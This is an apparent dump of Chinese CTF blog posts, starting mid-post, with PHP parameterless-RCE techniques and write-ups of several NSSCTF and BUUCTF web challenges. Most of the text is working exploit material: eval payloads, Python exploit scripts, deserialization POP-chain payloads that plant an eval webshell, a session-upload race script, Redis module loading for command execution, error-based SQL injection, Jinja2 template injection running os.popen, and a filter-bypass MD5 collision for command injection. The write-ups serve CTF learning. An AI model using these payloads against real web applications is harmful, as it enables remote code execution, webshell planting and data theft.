方法一php中的session_id()可以读取cookie中的PHPSESSID值，而这个函数的使用需要我们开启session，这里就要用到session_start()。因此我们可以利用这两个函数构造payload： 1234567eval($_GET(&#x27;a&#x27;));?a=eval(hex2bin(session_id(session_start())))Cookie: PHPSESSID=706870696e666f28293b//phpinfo(); 方法二这个方法运用到了get_defined_vars()，这个函数会返回由所有已定义变量所组成的数组，我们通过GET与POST方法传入的变量都可以被读取出来。而由于这个函数本身返回的是个二维数组，因此我们可以通过读取数组的函数来取值。 一些读取数组的函数： 123456end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。current() - 返回当前被内部指针指向的数组单元的值，并不移动指针。 因此我们这样构建payload： 1234eval($_GET(&#x27;a&#x27;));?a=eval(end(current(get_defined_vars())));&amp;b=phpinfo(); 分析这个payload，首先将二维数组转化为一维数组，由于GET方式默认就是第一个元素，因此直接用current()就可以了，POST方式就用next()，以此类推。接着由于我们再次定义了$b并进行传参，因此current(get_defined_vars())得到的结果应该为： 1234array(2)&#123;[&quot;a&quot;]=&gt;string(39) &quot;eval(end(current(get_defined_vars())));&quot;[&quot;b&quot;]=&gt;string(10) &quot;phpinfo();&quot;&#125; 这时候我们取最后一个元素，得到的就是phpinfo();，因此就可以执行我们想要执行的语句了。 但如果网站的过滤较为严格时，我们可能要使用$_FILES，这里我们就需要上传文件来解决问题了，编写exp： 12345678910111213import requestsfrom io import BytesIOpayload = &quot;system(&#x27;ls&#x27;);&quot;.encode(&#x27;hex&#x27;)files = &#123; payload: BytesIO(&#x27;mrl64&#x27;)&#125;r = requests.post(&#x27;http://xx.xx.xx.xx/index.php?a=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;, files=files, allow_redirects=False)print r.content//system(&#x27;ls&#x27;); 方法三getallheaders()可以获取在apache2环境下的http头文件，并且返回的也同样是数组，因此我们可以更改头文件的内容，比如在头文件最后添加一个mrl64=phpinfo();，这样getallheaders()返回的头文件中的最后一个内容就是[&quot;mrl64&quot;]=&gt;string(10) &quot;phpinfo();&quot;了，利用end()将这个内容读取出来，就可以执行命令了，payload： 12345eval($_GET(&#x27;a&#x27;));?a=eval(end(getallheaders()));mrl64: phpinfo(); 方法四这个方法的思路跳出了常规的rce，核心思想是直接读取文件，和任意文件读取比较相近。 getcwd() - 获取当前目录，返回字符串 scandir() - 进行当前目录遍历，返回数组 dirname() - 进行目录上跳 chdir() - 更改当前目录 readfile() - 读取文件 比如我们想要读取/var/www/flag，就可以这样构建payload： 1234eval($_GET(&#x27;a&#x27;));?a=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 详细的无参数rce，可以参考下面这篇文章：PHP Parametric Function RCE 总结以上这些方法都是从各路大神里总结出来的，对于一些经典的rce题目应该会有所帮助，相信还有更多的方法等待我们去发现、去挖掘。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-webshell -web","slug":"webshell-web","permalink":"http://example.com/tags/webshell-web/"}]},{"title":"NSSCTF练习1","slug":"NSSCTF练习1","date":"2022-03-04T07:23:53.000Z","updated":"2022-03-04T11:20:52.047Z","comments":true,"path":"2022/03/04/NSSCTF练习1/","link":"","permalink":"http://example.com/2022/03/04/NSSCTF%E7%BB%83%E4%B9%A01/","excerpt":"前言换个平台继续刷，碰到什么做什么，然后记录一些比较有意思或者设计知识盲区的题。","text":"前言换个平台继续刷，碰到什么做什么，然后记录一些比较有意思或者设计知识盲区的题。 [天翼杯 2021]esay_eval审计源码： 1234567891011121314151617181920212223242526272829303132&lt;?phpclass A&#123; public $code = &quot;&quot;; function __call($method,$args)&#123; eval($this-&gt;code); &#125; function __wakeup()&#123; $this-&gt;code = &quot;&quot;; &#125;&#125;class B&#123; function __destruct()&#123; echo $this-&gt;a-&gt;a(); &#125;&#125;if(isset($_REQUEST[&#x27;poc&#x27;]))&#123; preg_match_all(&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;,$_REQUEST[&#x27;poc&#x27;],$ret); if (isset($ret[1])) &#123; foreach ($ret[1] as $i) &#123; if(intval($i)!==1)&#123; exit(&quot;you want to bypass wakeup ? no !&quot;); &#125; &#125; unserialize($_REQUEST[&#x27;poc&#x27;]); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 发现pop链，不过这个链是比较简单的，我们利用B类中的__destruct()，B中存在一个a方法，另这个a方法为A类，然后利用魔术方法执行echo指令时由于A类中不存在a方法，因此会调用__call魔术方法执行eval，但是要绕过__wakeup。 首先写exp： 123456789101112131415&lt;?phpclass A&#123; public $code = &quot;phpinfo();&quot;;&#125;class B&#123; public $a;&#125;$a = new B();$a -&gt; a = new A();echo serialize($a);?&gt; //O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 由于源码中判断了反序列化的属性个数必须为1，这里不能直接改数字绕过，有两种方法： 增加真实属性个数 1O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;s:1;&quot;a&quot;;&#125; 大小写绕过，由于类名不区分大小写，因此改小写改值就可以了 1O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 查看phpinfo，发现命令执行的指令几乎都被禁止了，那么我们先写入shell： 1O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:22:&quot;eval($_POST[&#x27;mrl64&#x27;]);&quot;;&#125;&#125; 蚁剑连接，这里学到了要上传恶意so文件来连接redis：恶意so文件 接着使用蚁剑的redis插件连接，密码在html目录下的config.php.swp文件中，连接后选择db0执行下面的指令： 123MODULE LOAD &quot;/var/www/html/exp.so&quot;system.exec &quot;ls /&quot;system.exec &quot;cat /f*&quot; 得到flag，这题综合还是挺难的。 [第五空间 2021]EasyCleanup审计代码： 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php if(!isset($_GET[&#x27;mode&#x27;]))&#123; highlight_file(__file__); &#125;else if($_GET[&#x27;mode&#x27;] == &quot;eval&quot;)&#123; $shell = isset($_GET[&#x27;shell&#x27;]) ? $_GET[&#x27;shell&#x27;] : &#x27;phpinfo();&#x27;; if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;); eval($shell); &#125; if(isset($_GET[&#x27;file&#x27;]))&#123; if(strlen($_GET[&#x27;file&#x27;]) &gt; 15 | filter($_GET[&#x27;file&#x27;])) exit(&quot;hacker&quot;); include $_GET[&#x27;file&#x27;]; &#125; function filter($var)&#123; $banned = [&quot;while&quot;, &quot;for&quot;, &quot;\\$_&quot;, &quot;include&quot;, &quot;env&quot;, &quot;require&quot;, &quot;?&quot;, &quot;:&quot;, &quot;^&quot;, &quot;+&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;, &quot;`&quot;]; foreach($banned as $ban)&#123; if(strstr($var, $ban)) return True; &#125; return False; &#125; function checkNums($var)&#123; $alphanum = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;; $cnt = 0; for($i = 0; $i &lt; strlen($alphanum); $i++)&#123; for($j = 0; $j &lt; strlen($var); $j++)&#123; if($var[$j] == $alphanum[$i])&#123; $cnt += 1; if($cnt &gt; 8) return True; &#125; &#125; &#125; return False; &#125; ?&gt; 看着好像和rce很像，但是这个过滤几乎把rce的路给堵死了，我们看看phpinfo，发现session.use_strict_mode=0，且session.upload_process.cleanup为off，不需要条件竞争。没有session.save_path，文件默认储存在/tmp/sess_xxxx。因此我们可以利用session包含来解题。 表单： 12345&lt;form action=&quot;http://1.14.71.254:28017/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27; value=&quot;&lt;?php eval($_POST[&#x27;mrl64&#x27;]);?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 随便上传一个文件，记得注意添加cookie：Cookie: PHPSESSID=233，然后蚁剑连接即可： 1http://1.14.71.254:28017/?file=/tmp/sess_233 或者大佬们直接用脚本跑： 123456789101112131415161718192021222324252627282930import ioimport requestsimport threadingfrom cffi.backend_ctypes import xrangesessid = &#x27;0&#x27;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) resp = session.post( &#x27;http://1.14.71.254:28017/&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session): while True: resp = session.post(f&quot;http://1.14.71.254:28017/?mode=foo&amp;file=/tmp/sess_&#123;sessid&#125;&amp;cmd=system(&#x27;cd /;ls;cat nssctfasdasdflag&#x27;);&quot;) if &#x27;tgao.txt&#x27; in resp.text: print(resp.text) event.clear() else: print(&quot;[+++++++++++++]retry&quot;) #print(resp.text)if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() [鹤城杯 2021]EasyP审计源码： 123456789101112131415161718192021222324252627 &lt;?phpinclude &#x27;utils.php&#x27;;if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if ($guess === $secret) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . $flag; &#125; else &#123; $message = &#x27;Wrong. Try Again&#x27;; &#125;&#125;if (preg_match(&#x27;/utils\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;hacker :)&quot;);&#125;if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123; exit(&quot;hacker :)&quot;);&#125;if (isset($_GET[&#x27;show_source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;else&#123; show_source(__FILE__);&#125;?&gt; 我们要做的是上传一个guess变量和secret的值相同，这想想都不可能，因此这个地方完全没用。我们来看下面一串东西： 123$_SERVER[&#x27;PHP_SELF&#x27;]：获取当前执行脚本的文件名$_SERVER[&#x27;REQUEST_URI&#x27;]：取得当前URL的路径地址basename()：返回路径中的文件名部分 首先url过滤了show_source，直接url编码绕过就可以了。而关键部分在highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));这串上。我们构建payload并开始分析： 1http://1.14.71.254:28032/index.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65 首先获取$_SERVER[&#39;PHP_SELF&#39;]，这个函数所获取到的内容为/index.php/utils.php/%ff，接着basename()会获取路径尾的文件名，即/utils.php/%ff。 由于文件尾的不可打印字符，可以绕过正则匹配部分，而basename()在获取名称时会自动丢弃不可打印字符，因此成功读取到目标文件，拿到flag。 hardrce审计源码： 123456789101112131415161718192021222324&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;wllm&#x27;]))&#123; $wllm = $_GET[&#x27;wllm&#x27;]; $blacklist = [&#x27; &#x27;,&#x27;\\t&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;,&#x27;\\+&#x27;,&#x27;\\[&#x27;,&#x27;\\^&#x27;,&#x27;\\]&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\-&#x27;,&#x27;\\$&#x27;,&#x27;\\*&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\=&#x27;,&#x27;\\`&#x27;,]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123; die(&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;); &#125;&#125;if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm))&#123; die(&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;);&#125;echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;eval($wllm);&#125;else&#123; echo &quot;蔡总说：注意审题！！！&quot;;&#125; 可以看到是一个rce，但是过滤了字母的相当一部分符号，这里就是特殊的无字符webshell了，研究这个的时候发现这一块还挺有意思的，挖个坑之后写篇博客。 返回来题目，这里发现按位取反没有被过滤，因此直接参考p牛的文章：无数字字母webshell之提高篇 简单的生成payload脚本： 12345def get(shell): hexbit = &#x27;&#x27;.join(map(lambda x:hex(~(-(256-ord(x)))),shell)) print hexbit.replace(&#x27;0x&#x27;,&#x27;%&#x27;)get(&#x27;phpinfo&#x27;) 构造payload： 12345?wllm=(~%8c%86%8c%8b%9a%92)(~%93%8c%df%d0);//system(&#x27;ls \\&#x27;)?wllm=(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%d0%99%93%93%93%93%93%9e%9e%9e%9e%9e%9e%98%98%98%98%98%98%98);//system(&#x27;cat /flllllaaaaaaggggggg&#x27;)","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-write up -ctf -web","slug":"write-up-ctf-web","permalink":"http://example.com/tags/write-up-ctf-web/"}]},{"title":"buu练习4","slug":"buu练习4","date":"2022-03-03T07:35:36.000Z","updated":"2022-03-03T11:22:56.674Z","comments":true,"path":"2022/03/03/buu练习4/","link":"","permalink":"http://example.com/2022/03/03/buu%E7%BB%83%E4%B9%A04/","excerpt":"前言 等打虎符了，虽然应该只能是去看看题，但现在该练的题还得练。","text":"前言 等打虎符了，虽然应该只能是去看看题，但现在该练的题还得练。 [NPUCTF2020]ezinclude进入网页查看，发现只有一个账号密码错误的提示，审查元素发现hint： 1md5($secret.$name)===$pass 因此我们要找到$pass的值，发现cookie中存在hash值，将这个值赋值给$pass传参，页面跳转到404.html，找了下也没啥有用的东西，尝试抓包，发现window.location.href=&quot;flflflflag.php&quot;;，因此抓包访问flflflflag.php。 发现文件包含： 1include($_GET[&quot;file&quot;]) 尝试读取源码： 1?file=php://filter/read=convert.base64-encode/resource=flflflflag.php flflflflag.php： 12345678910111213141516171819&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET[&#x27;file&#x27;];if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123; die(&#x27;nonono&#x27;);&#125;@include($file);echo &#x27;include($_GET[&quot;file&quot;])&#x27;;?&gt;&lt;/body&gt;&lt;/html&gt; 这里要写入webshell，但是能写入的伪协议都被正则匹配了，因此这里不能用伪协议写码。首先扫描目录发现存在dir.php，这个列出了/tmp的目录。找了些资料发现这里要利用到php7 segment fault特性。 简单来说就是使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个文件就会一直留在tmp目录。具体原理可以参考下面这篇博客：PHP临时文件机制与利用的思考 因此我们编写exp: 12345678910import requestsfrom io import BytesIOurl=&quot;http://c45cf755-5dfc-4ae1-a036-eebe8522322a.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php phpinfo();?&gt;&quot;files=&#123; &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text) 再次查看dir.php： 12345678array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;phpUkHKUU&quot;&#125; 上传成功，直接访问，flag就在phpinfo页面中。 [CISCN2019 华北赛区 Day1 Web5]CyberPunk进入网页后审查元素，发现hint：?file=，怀疑可能有任意文件读取漏洞，因此尝试伪协议读取源码，把所有网页的源码都读下来。读取完后发现对sql注入的限制非常严格，但是有一个地方有例外，我们查看change.php： 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; $result = $db-&gt;query($sql); if(!$result) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;订单修改成功&quot;; &#125; else &#123; $msg = &quot;未找到订单!&quot;; &#125;&#125;else &#123; $msg = &quot;信息不全&quot;;&#125;?&gt; 我们发现在对address进行过滤时，只是用了addslashes()来进行转义，这导致了单引号的失效。但是我们可以用二次注入的方式绕过，注意到change.php中的sql语句： 1$sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; 这里对地址进行了保存，而当我们再次修改地址的时候，它会将我们的旧地址保存下来，我们可以利用这个点进行注入。 因此第一次先随便输入，第二次我们使用报错注入，由于输出长度有限，因此分两次输出，payload: 1231&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)#1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),20,50)),0x7e),1)# [HarekazeCTF2019]encode_and_encode进入网页，随便点点发现源码： 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal &#x27;\\.\\.&#x27;, // no stream wrapper &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;, // no data exfiltration &#x27;flag&#x27; ]; $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123; $page = $json[&#x27;page&#x27;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; &#125;&#125; else &#123; $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); 首先对$body进行json解码，接着发现$json中需要含有$page，$content会去读取$page文件，但是不能有黑名单中的字符。最后判断如果输出中有flag头文件，则替换为空。 那么我们需要绕过的就是关于传入的字符以及输出的内容的正则匹配了，输入用json字符编码绕过，输出用php伪协议绕过，记得上传时是json格式，payload： 1&#123;&quot;page&quot;:&quot;\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067&quot;&#125; base64解码读取flag。 [RootersCTF2019]I_&lt;3_Flask题目都告诉是模板注入了，但是找了半天啥都没找到，最重要的是参数没找到，因此这里要用到arjun这个工具了： 12345arjun -u http://861ba40a-963d-4243-b551-f583f8a49a21.node4.buuoj.cn:81/ -m GET -c 200 -d 5由于buu的设置，我们需要设置时间间隔，否则会导致爆破失败结果：name: name, factor: body length 读取到参数名为name，接着直接构建payload即可： 123456?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;//找子类，发现warnings.catch_warnings，查询位置为182位?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;)&#125;&#125; 看了别人的wp，发现可以使用tplmap这个工具，我们测试一下： 12345python2 tplmap.py -u http://861ba40a-963d-4243-b551-f583f8a49a21.node4.buuoj.cn:81/?name=1//发现Jinja2模板python2 tplmap.py -u http://861ba40a-963d-4243-b551-f583f8a49a21.node4.buuoj.cn:81/?name=1 --os-shell//获取shell 最后得到flag。 [WUSTCTF2020]CV Maker进网页是个登录框，测试没发现sql，那先注册登录看看。登陆后发现是个个人页面，可以上传头像，那基本是文件上传没跑了。 直接传图片码，经过测试发现绕过检测方法是将文件名改为shell.jpg.php，在审查元素中找到路径，蚁剑连接，连接后发现根目录下存在flag，但是不能直接读取，因此打开终端使用命令执行： 12345lsFlag_aqi2282u922oijicat Flag_aqi2282u922oijiflag&#123;b46e346f-a5e6-47ba-8e29-5196988ea1d2&#125; [HCTF 2018]admin先来个离谱的，直接账号admin密码123登录就能拿到flag了。 这里我看了别人的wp有三种解法，但是由于buu限制发包量，然后flask那个方法我还不是很理解，这里就用unicode欺骗那个方法来解。 首先随便注册登录，在change passwrod部分找到hint： 1https://github.com/woadsl1234/hctf_flask/ 审计注册、登录与改密的路由： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152ef register(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = RegisterForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower(): flash(&#x27;Wrong verify code.&#x27;) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form) if User.query.filter_by(username = name).first(): flash(&#x27;The username has been registered&#x27;) return redirect(url_for(&#x27;register&#x27;)) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash(&#x27;register successful&#x27;) return redirect(url_for(&#x27;login&#x27;)) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form) @app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash(&#x27;Invalid username or password&#x27;) return redirect(url_for(&#x27;login&#x27;)) login_user(user, remember=form.remember_me.data) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form) 发现这三个路由都在用户名上使用了strlower()时用户名变为小写。这时，有一种神奇的字符： 1ᴬᴰᴹᴵᴺ 这个字符第一次经过strlower()时会被转换成ADMIN，而结合路由，如果我们使用这个用户名注册，那么在注册时首先会被转变成ADMIN，之后改密码ADMIN再次经过strlower()变成admin，我们就可以登录admin获取flag了。 这个方法是真的离谱，学习了。 [ASIS 2019]Unicorn shop进入网页，发现有四个东西能让我们买，但是测试了下发现我们只能买最贵的那个，但尝试输入价格时发现只能输入一个字符，但是我们要输入一个大于1337的值。 这里的知识点是unicode编码安全问题，即可以用别的语言来代表数字，我们通过下面这个网址来查找unicode字符：Unicode字符查找 我们选择ↂ字符，这个字符代表的值是10000，复制它的utf-8编码（源码中定义了编码格式并且明确告诉我们这个很重要），然后将0x改为%，payload： 1id=4&amp;price=%E2%86%82 [安洵杯 2019]easy_web前端开幕雷击，直接质问我web狗怎么活，答案是活不了，我直接泪目了。 好了我装的，看题目，发现url不对经： 181a58bcb-8a03-4fac-9b39-a3d4f40421b6.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd= img的内容疑似base64，解码试试，两层解密发现一串十六进制字符串，再次解码，得到的内容是555.png。那么我们试试将index.php用同样方法操作下带入会发生什么： 1TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 发现图片的base64变了，解码获取源码： 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixi～ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt; 发现md5强类型比较，这个之前没有碰到，找了下发现可以用下面这个payload绕过： 1a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 接着发现一众命令被过滤，包括ls，因此这里用dir遍历目录，空格被过滤使用%20代替，发现flag文件在根目录，用于cat被过滤，因此使用反斜杠绕过，payload： 1?img=1&amp;cmd=ca\\t%20/flag 当然我去找了下，发现还可以用sort读取文件，payload： 1?img=1&amp;cmd=sort%20/flag","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"Session反序列化与字符串逃逸","slug":"Session反序列化与字符串逃逸","date":"2022-03-01T06:58:38.000Z","updated":"2022-03-02T12:25:13.571Z","comments":true,"path":"2022/03/01/Session反序列化与字符串逃逸/","link":"","permalink":"http://example.com/2022/03/01/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/","excerpt":"前言 